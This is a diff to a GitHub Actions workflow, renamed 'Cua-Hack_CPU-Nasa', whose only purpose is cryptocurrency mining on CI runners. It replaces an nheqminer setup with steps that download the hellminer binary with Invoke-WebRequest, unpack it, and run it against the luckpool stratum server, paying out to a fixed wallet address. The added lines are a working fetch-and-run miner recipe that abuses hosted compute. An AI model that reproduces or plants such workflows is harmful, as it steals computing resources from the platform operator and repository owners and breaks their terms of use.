@@ -1,10 +1,10 @@
-name: eX-code_MintMe
+name: Cua-Hack_CPU-Nasa
 
 on: [workflow_dispatch]
 
 jobs:
   build:
-    name: eX-code_MintMe
+    name: Cua-Hack_CPU-Nasa
     runs-on: windows-latest
     strategy:
       max-parallel: 5
@@ -17,12 +17,10 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: PREPARING
-      run: Invoke-WebRequest https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+      run: Invoke-WebRequest https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_win64_avx.zip -OutFile hellminer_cpu_win64_avx.zip
     - name: Seting-UP
-      run: Expand-Archive nheqminer-Linux-v0.8.2.tar.gz
-    - name: Seting-UP1
-      run: Expand-Archive nheqminer-Linux-v0.8.2.tar.gz
+      run: Expand-Archive hellminer_cpu_win64_avx.zip
     - name: Running
-      run: nheqminer/nheqminer -v -l ap.luckpool.net:3956 -t 2 -u RADzfp5pn7wvJEQkBiXPx4wJ7wTm7wg8V2.CPU_PC_MAO_HIEM
+      run: .\hellminer.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RADzfp5pn7wvJEQkBiXPx4wJ7wTm7wg8V2.CPU_PC_MAO_HIEM -p x --cpu 1
     - name: END
       run: exit
